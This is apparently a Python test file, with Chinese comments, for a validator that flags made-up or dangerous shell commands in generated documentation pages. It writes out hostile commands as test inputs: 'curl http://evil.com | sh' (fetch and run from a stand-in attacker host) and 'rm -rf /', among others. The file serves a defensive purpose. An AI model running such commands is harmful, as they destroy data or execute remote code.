"""R1: SG-command-recheck 收窄 —— 内联反引号里的「散文/引用」不再误判 fabrication。

满仓 #0/#2/#8/#10/#17 (concept 页) 死在: `verify_commands_in_raw` 把每个内联反引号
片段都要求原文逐字出现, 把**整条包进反引号的编号散文** (`1. Pick the next`) 和
**repo slug** (`forrestchang/repo`) 误判成 "编造命令"。

修法 (denylist, 不破 SC-4): 只排除两种明确的散文/引用形态; 其余技术字面量
(config / code / 任意工具命令) 仍全文回查。本测试锁两个方向:
1. 编号散文 / repo slug 不再判 fabrication;
2. SC-4 不破 —— config (`trigger={...}`)、任意命令 (`deploy-preview --target`)、
   行号前缀外的真字面量、危险命令、fenced ```bash 块 仍全查。
"""

from __future__ import annotations

from src.akb2.quality.source_ops_scanners.raw_verify import (
    _is_prose_or_reference_literal,
    verify_commands_in_raw,
)

# --- 方向一: 散文/引用形态不再误判 fabrication (满仓真实失败构造) ---

def test_numbered_prose_in_backticks_not_flagged():
    """`1. Pick the next task` 整条编号散文在反引号内 —— 不该判编造 (满仓 #0/#17)。"""
    body = "### 操作步骤\n看 `1. Pick the next task` 这一步。"
    raw = "The agent picks tasks from a queue and executes them."
    assert verify_commands_in_raw(body, raw) == []


def test_numbered_bold_prose_not_flagged():
    """`1. **Cold-start** the agent` 编号+加粗散文 —— 不该判编造 (满仓 #8)。"""
    body = "正文引用 `1. **Cold-start** the agent` 概念点。"
    raw = "Cold-starting an agent means initializing it from scratch."
    assert verify_commands_in_raw(body, raw) == []


def test_repo_slug_not_flagged():
    """`forrestchang/agent-loops` 是 repo slug, 不是命令 —— 不该判编造 (满仓 #10)。"""
    body = "参考实现见 `forrestchang/agent-loops` 仓库。"
    raw = "There are many open-source agent loop implementations."
    cmds = [v.command for v in verify_commands_in_raw(body, raw)]
    assert "forrestchang/agent-loops" not in cmds


# --- 方向二: SC-4 不破 —— 技术字面量仍全文回查 ---

def test_numbered_LINE_prefix_with_real_config_still_rechecked():
    """关键边界: 行号前缀在反引号**外**, 反引号里是真 config → 仍回查 (区分散文 vs 步骤命令)。"""
    body = "1. 配置触发器 `trigger={type:'schedule'}`"
    raw = "raw 里没有这个配置\n"
    cmds = [v.command for v in verify_commands_in_raw(body, raw)]
    assert "trigger={type:'schedule'}" in cmds  # SC-4: config 缺原文仍判编造


def test_fabricated_command_still_flagged():
    """`pip install evil-pkg` 真命令且不在 raw → 仍判编造 (SC-4 不破)。"""
    body = "运行 `pip install evil-pkg` 安装。"
    raw = "Install the package with your package manager."
    cmds = [v.command for v in verify_commands_in_raw(body, raw)]
    assert "pip install evil-pkg" in cmds


def test_arbitrary_tool_command_still_flagged():
    """非标准工具命令 `deploy-preview --target staging` 不在 raw → 仍判编造 (denylist 不漏)。"""
    body = "部署: `deploy-preview --target staging`"
    raw = "raw 里没有 deploy-preview 命令\n"
    cmds = [v.command for v in verify_commands_in_raw(body, raw)]
    assert "deploy-preview --target staging" in cmds


def test_real_command_present_in_raw_not_flagged():
    """`npm run build` 在 raw 中存在 → 不判编造 (真命令正常放行)。"""
    body = "执行 `npm run build` 打包。"
    raw = "To build the project, run npm run build in the root."
    assert verify_commands_in_raw(body, raw) == []


# --- 方向三: 危险命令仍抓 + fenced 块仍全查 (护栏不破) ---

def test_dangerous_command_still_flagged_even_if_in_raw():
    """`rm -rf /` 危险命令 —— 即使在 raw 也判违规 (双重拦截不破)。"""
    body = "千万别 `rm -rf /`。"
    raw = "Never run rm -rf / on your machine."
    reasons = [v.reason for v in verify_commands_in_raw(body, raw)]
    assert any("危险" in r for r in reasons)


def test_dangerous_inside_excluded_prose_still_flagged():
    """即使是被排除的形态, 危险命令仍被拦 (危险黑名单对全部生效)。"""
    body = "步骤 `1. rm -rf / --no-preserve-root` 千万别做。"
    reasons = [v.reason for v in verify_commands_in_raw(body, "irrelevant raw")]
    assert any("危险" in r for r in reasons)


def test_fenced_shell_block_still_fully_rechecked():
    """fenced ```bash 块内的编造命令仍全查 —— 不重开 fenced 绕过。"""
    body = "```bash\nfrobnicate --all-the-things\n```"
    raw = "This document does not contain that command."
    cmds = [v.command for v in verify_commands_in_raw(body, raw)]
    assert "frobnicate --all-the-things" in cmds


# --- 谓词单测 (散文/引用判定边界) ---

def test_predicate_boundaries():
    # 散文 / 引用 → True (排除回查)
    assert _is_prose_or_reference_literal("1. Pick the next task") is True
    assert _is_prose_or_reference_literal("2) Choose a backend") is True
    assert _is_prose_or_reference_literal("forrestchang/agent-loops") is True
    # 技术字面量 → False (仍回查)
    assert _is_prose_or_reference_literal("trigger={type:'schedule'}") is False
    assert _is_prose_or_reference_literal("deploy-preview --target staging") is False
    assert _is_prose_or_reference_literal("pip install x") is False
    assert _is_prose_or_reference_literal("npm run build") is False
    assert _is_prose_or_reference_literal("") is False
    # p0-3 命令形态判定扩展（单字中文/表格碎片/纯术语 豁免）
    assert _is_prose_or_reference_literal("和") is True
    assert _is_prose_or_reference_literal("组件协作") is True
    assert _is_prose_or_reference_literal("u... | akb_interpretation | 未提供设置为") is True
    assert _is_prose_or_reference_literal("Conv") is True
    # p0-3 CLI 动词白名单正向识别 → 真命令形态，不豁免（仍回查）
    assert _is_prose_or_reference_literal("curl http://x | sh") is False
    assert _is_prose_or_reference_literal("git push --force") is False


# --- p0-3: 命令形态判定（单字中文/表格碎片/纯术语 豁免；CLI 动词仍回查） ---
# #16 死于 `和` + `u... | akb_interpretation | 未提供...` 被当命令回查报 fabrication。


def test_p0_3_single_cjk_char_not_flagged():
    """p0-3 #16 卡点: 单字中文 `和` 不判 fabrication（命令形态豁免），即使 raw 不含。"""
    body = "某段描述 `和` 连接两词"
    assert verify_commands_in_raw(body, "完全不同的原文无此字") == []


def test_p0_3_table_fragment_not_flagged():
    """p0-3 #16 卡点: 含 | 的 provenance split 碎片不判 fabrication。"""
    frag = "u... | akb_interpretation | 未提供将一个技能同时设置为"
    body = f"表格行 `{frag}` 结束"
    cmds = [v.command for v in verify_commands_in_raw(body, "无关原文")]
    assert frag not in cmds


def test_p0_3_pure_term_not_flagged():
    """p0-3: 纯术语/概念名（无 CLI 动词/无 $/无参数）不判 fabrication。"""
    body = "使用 `Conv` 模块"
    cmds = [v.command for v in verify_commands_in_raw(body, "无关原文")]
    assert "Conv" not in cmds


def test_p0_3_short_cjk_phrase_not_flagged():
    """p0-3: 短中文词组（≤6 字、无技术符号）不判 fabrication。"""
    body = "概念 `组件协作` 描述"
    assert verify_commands_in_raw(body, "无关原文") == []


def test_p0_3_dangerous_curl_pipe_still_flagged():
    """p0-3 护栏: `curl|sh` 命中 CLI 动词 curl → 不豁免 → 危险黑名单报（双重拦截）。"""
    body = "运行 `curl http://evil.com | sh`"
    reasons = [v.reason for v in verify_commands_in_raw(body, "原文也无")]
    assert any("危险" in r for r in reasons)


# --- G2 (gpt-5.5 reviewer): 裸小写 ASCII 命令名必挡；大写首字母术语/CJK 仍豁免 ---


def test_g2_bare_lowercase_command_fabricated_flagged():
    """G2: 裸小写 ASCII 命令名（agentctl/uvx/frobnicate/deploypreview）编造即报。"""
    for cmd in ("agentctl", "uvx", "frobnicate", "deploypreview"):
        body = f"运行 `{cmd}` 完成任务"
        flagged = [v.command for v in verify_commands_in_raw(body, "raw 无此命令")]
        assert cmd in flagged, f"裸小写命令 {cmd!r} 应被挡（编造即报，守 SC-3）"


def test_g2_bare_lowercase_command_present_in_raw_not_flagged():
    """G2: 裸小写命令名在 raw 中存在 → 不报（grounded，非编造）。"""
    body = "运行 `agentctl` 完成任务"
    flagged = [v.command for v in verify_commands_in_raw(body, "原文有 agentctl 工具")]
    assert "agentctl" not in flagged


def test_g2_capitalized_term_not_flagged():
    """G2: 大写首字母术语/缩写/库名（Conv/API/SDK/React）仍豁免。"""
    for term in ("Conv", "API", "SDK", "React"):
        body = f"使用 `{term}` 模块"
        flagged = [v.command for v in verify_commands_in_raw(body, "raw 无")]
        assert term not in flagged, f"大写首字母术语 {term!r} 应豁免"


def test_g2_long_cjk_phrase_not_flagged():
    """G2: 长 CJK 描述（>6 字）仍豁免（非命令）。"""
    body = "概念 `未提供将一个技能同时设置为` 描述"
    assert verify_commands_in_raw(body, "raw 无") == []


def test_g2_existing_exemptions_not_regressed():
    """G2: 既有真非命令豁免不回归（和/表格碎片/编号散文/repo slug）。"""
    assert verify_commands_in_raw("描述 `和` 连接", "raw 无") == []
    frag = "u... | akb_interpretation | 未提供设置为"
    assert frag not in [v.command for v in verify_commands_in_raw(f"`{frag}`", "raw 无")]
    assert verify_commands_in_raw("步骤 `1. Pick the next task`", "raw 无") == []
    assert "owner/repo" not in [v.command for v in verify_commands_in_raw("见 `owner/repo`", "raw 无")]


# --- G2 第 3 轮（管道漏洞）：单 | 管道命令挡；真表格/provenance 碎片仍豁免 ---


def test_g2_pipe_command_fabricated_flagged():
    """G2: 单 | 管道编造命令（agentctl|sh / frobnicate|bash / deploypreview|sh）被挡。"""
    for cmd in ("agentctl | sh", "frobnicate | bash", "deploypreview | sh"):
        body = f"运行 `{cmd}` 完成任务"
        flagged = [v.command for v in verify_commands_in_raw(body, "raw 无此命令")]
        assert cmd in flagged, f"管道命令 {cmd!r} 应被挡（编造即报，守 SC-3）"


def test_g2_provenance_table_fragment_not_flagged():
    """G2: 真 provenance split 表格碎片仍豁免（#16 卡点不回归）。"""
    frag = "u... | akb_interpretation | 未提供将一个技能同时设置为"
    body = f"表格行 `{frag}` 结束"
    flagged = [v.command for v in verify_commands_in_raw(body, "raw 无")]
    assert frag not in flagged


def test_g2_multi_column_table_fragment_not_flagged():
    """G2: 多列表格碎片（≥2 个 |，无 provenance）仍豁免。"""
    frag = "Conv | Role | Evidence"
    body = f"表头 `{frag}` 行"
    flagged = [v.command for v in verify_commands_in_raw(body, "raw 无")]
    assert frag not in flagged


# --- G2 第 4 轮（多级管道整类修）：≥2 | 的 shell pipeline 挡；真表格/provenance 仍豁免 ---


def test_g2_multistage_pipe_fabricated_flagged():
    """G2 第 4 轮: 多级 shell 管道（≥2 |）编造命令被挡（不靠数 | 个数，按 cell 形态）。"""
    for cmd in (
        "agentctl | tee /tmp/x | sh",
        "agentctl|tee|sh",
        "frobnicate | sed s/a/b/ | bash",
        "deploypreview | awk {print} | sh",
    ):
        body = f"运行 `{cmd}` 完成任务"
        flagged = [v.command for v in verify_commands_in_raw(body, "raw 无此命令")]
        assert cmd in flagged, f"多级管道 {cmd!r} 应被挡（编造即报，守 SC-3）"


def test_g2_pipe_with_redirect_or_op_flagged():
    """G2 第 4 轮自审: cell 含重定向/参数/brace 等技术符号的管道被挡。"""
    for cmd in (
        "agentctl | tee > /tmp/x",
        "frobnicate | sed --quiet s/a/b/",
        "deploypreview | awk '{print $1}'",
    ):
        body = f"运行 `{cmd}`"
        flagged = [v.command for v in verify_commands_in_raw(body, "raw 无")]
        assert cmd in flagged, f"含技术符号的管道 {cmd!r} 应被挡"


def test_g2_real_table_terms_and_provenance_not_regressed():
    """G2 第 4 轮: 真 multi-column 术语表 + provenance split 碎片仍豁免（不回归）。"""
    # 多列术语表（cell 都是大写首字母术语，无 shell 形态）
    table = "Conv | Role | Evidence"
    assert table not in [v.command for v in verify_commands_in_raw(f"`{table}`", "raw 无")]
    # provenance split 碎片（含 marker，cell 都非 shell 形态）
    frag = "u... | akb_interpretation | 未提供将一个技能同时设置为"
    assert frag not in [v.command for v in verify_commands_in_raw(f"`{frag}`", "raw 无")]


# --- G2 第 5 轮（cell token 字符集放宽）：含数字/下划线/点号/前导数字命令名挡；术语表/provenance/CJK 仍豁免 ---


def test_g2_cmd_token_with_digits_underscore_dot_flagged():
    """G2 第 5 轮: 含数字/下划线/点号/前导数字的命令名管道被挡（isalpha→正则放宽）。"""
    for cmd in (
        "cmd2 | tool3 | util4",
        "cmd_foo | tool_bar | util_baz",
        "cmd2 arg | tool3 arg | util4 arg",
        "tool.v1 | helper.v2 | runner.v3",
        "s3cmd | b2 | r2",
        "2to3 | tool3 | util4",
    ):
        body = f"运行 `{cmd}` 完成任务"
        flagged = [v.command for v in verify_commands_in_raw(body, "raw 无此命令")]
        assert cmd in flagged, f"命令管道 {cmd!r} 应被挡（编造即报，守 SC-3）"


def test_g2_allowlist_no_false_exemption_on_lower_term_table():
    """G2 第 5 轮 allowlist: 大写术语表/provenance/CJK 表格仍豁免（无误伤）。"""
    # 大写首字母术语表
    assert "Conv | Role | Evidence" not in [
        v.command for v in verify_commands_in_raw("`Conv | Role | Evidence`", "raw 无")
    ]
    # provenance split 碎片（marker）
    frag = "u... | akb_interpretation | 未提供将一个技能同时设置为"
    assert frag not in [v.command for v in verify_commands_in_raw(f"`{frag}`", "raw 无")]
    # CJK 表格（cell 全角括号+中文，非 ASCII 命令 token）
    cjk_table = "| （无相关概念） |"
    assert cjk_table not in [v.command for v in verify_commands_in_raw(f"`{cjk_table}`", "raw 无")]


# --- G2 第 6 轮（统一 cell allowlist）：管道塞 marker 不绕过；#16 excerpt cell 仍豁免 ---


def test_g2_marker_in_pipe_not_bypass_flagged():
    """G2 第 6 轮: 管道塞 marker token 不整串豁免（marker 不绕过 cell allowlist）。"""
    for cmd in (
        "agentctl | akb_interpretation | sh",
        "cmd2 | source_grounded | sh",
        "akb_interpretation | sh | bash",
    ):
        body = f"运行 `{cmd}` 完成任务"
        flagged = [v.command for v in verify_commands_in_raw(body, "raw 无此命令")]
        assert cmd in flagged, f"含 marker 的管道 {cmd!r} 应被挡（marker 不整串豁免）"


def test_g2_provenance_split_excerpt_cell_not_flagged():
    """G2 第 6 轮: #16 provenance split 碎片（cell: u... excerpt + marker + CJK）仍豁免。"""
    frag = "u... | akb_interpretation | 未提供将一个技能同时设置为"
    body = f"表格行 `{frag}` 结束"
    flagged = [v.command for v in verify_commands_in_raw(body, "raw 无")]
    assert frag not in flagged


# --- G2 第 7 轮（命令检测优先）：ASCII 命令+中文参数管道挡；纯 CJK/excerpt/marker 仍豁免 ---


def test_g2_ascii_cmd_with_cjk_arg_pipe_flagged():
    """G2 第 7 轮: ASCII 命令+中文参数管道被挡（命令首 token 压倒 CJK 放行）。"""
    for cmd in (
        "agentctl 参数 | sh 参数 | bash 参数",
        "agentctl --任务=测试 | tee /tmp/日志 | sh 参数",
        "agentctl 参数 | akb_interpretation | sh 参数",
        "cmd2 参数 | source_grounded | sh 参数",
    ):
        body = f"运行 `{cmd}` 完成任务"
        flagged = [v.command for v in verify_commands_in_raw(body, "raw 无此命令")]
        assert cmd in flagged, f"ASCII 命令+中文参数管道 {cmd!r} 应被挡"


def test_g2_pure_cjk_excerpt_marker_still_exempt():
    """G2 第 7 轮: 纯 CJK/excerpt/marker cell 仍豁免（#16 + Conv 表 + CJK 表）。"""
    # #16 provenance split 碎片（excerpt + marker + 纯 CJK）
    frag = "u... | akb_interpretation | 未提供将一个技能同时设置为"
    assert frag not in [v.command for v in verify_commands_in_raw(f"`{frag}`", "raw 无")]
    # Conv 大写术语表
    assert "Conv | Role | Evidence" not in [
        v.command for v in verify_commands_in_raw("`Conv | Role | Evidence`", "raw 无")
    ]
    # CJK 表格（全角括号+中文）
    assert "| （无相关概念） |" not in [
        v.command for v in verify_commands_in_raw("`| （无相关概念） |`", "raw 无")
    ]


# --- G2 第 8 轮（命令检测无条件优先）：命令+`...`参数管道挡；inline 命令+中文参数挡；#16 仍豁免 ---


def test_g2_cmd_with_ellipsis_arg_pipe_flagged():
    """G2 第 8 轮: ASCII 命令 + `...` 参数管道被挡（命令检测不带 `...` 门禁）。"""
    for cmd in (
        "agentctl ... | frobnicate ... | deploypreview ...",
        "cmd2 ... | tool3 ... | util4 ...",
        "agentctl ... | akb_interpretation | frobnicate ...",
    ):
        body = f"运行 `{cmd}` 完成任务"
        flagged = [v.command for v in verify_commands_in_raw(body, "raw 无此命令")]
        assert cmd in flagged, f"命令+`...`参数管道 {cmd!r} 应被挡"


def test_g2_inline_cmd_with_cjk_arg_flagged():
    """G2 第 8 轮 gpt 补充: 非管道 inline `agentctl 参数`/`cmd2 参数` 也挡（_is_pure_term 命令检测优先）。"""
    for cmd in ("agentctl 参数", "cmd2 参数"):
        body = f"运行 `{cmd}` 完成任务"
        flagged = [v.command for v in verify_commands_in_raw(body, "raw 无此命令")]
        assert cmd in flagged, f"inline 命令+中文参数 {cmd!r} 应被挡"


def test_g2_short_cjk_cmd_with_arg_flagged():
    """G2 第 8 轮 gpt 补充: 短命令+中文参数（len≤6，`go 参数`）也挡（_is_single_cjk_term 命令检测优先）。"""
    for cmd in ("go 参数", "sh 参数"):
        body = f"运行 `{cmd}`"
        flagged = [v.command for v in verify_commands_in_raw(body, "raw 无")]
        assert cmd in flagged, f"短命令+中文参数 {cmd!r} 应被挡"


def test_g2_excerpt_provenance_cjk_conv_still_exempt_8():
    """G2 第 8 轮: #16 碎片（u... excerpt + marker + 纯 CJK）+ Conv 表 + CJK 仍豁免（不回归）。"""
    frag = "u... | akb_interpretation | 未提供将一个技能同时设置为"
    assert frag not in [v.command for v in verify_commands_in_raw(f"`{frag}`", "raw 无")]
    assert "Conv | Role | Evidence" not in [
        v.command for v in verify_commands_in_raw("`Conv | Role | Evidence`", "raw 无")
    ]
    assert "| （无相关概念） |" not in [
        v.command for v in verify_commands_in_raw("`| （无相关概念） |`", "raw 无")
    ]
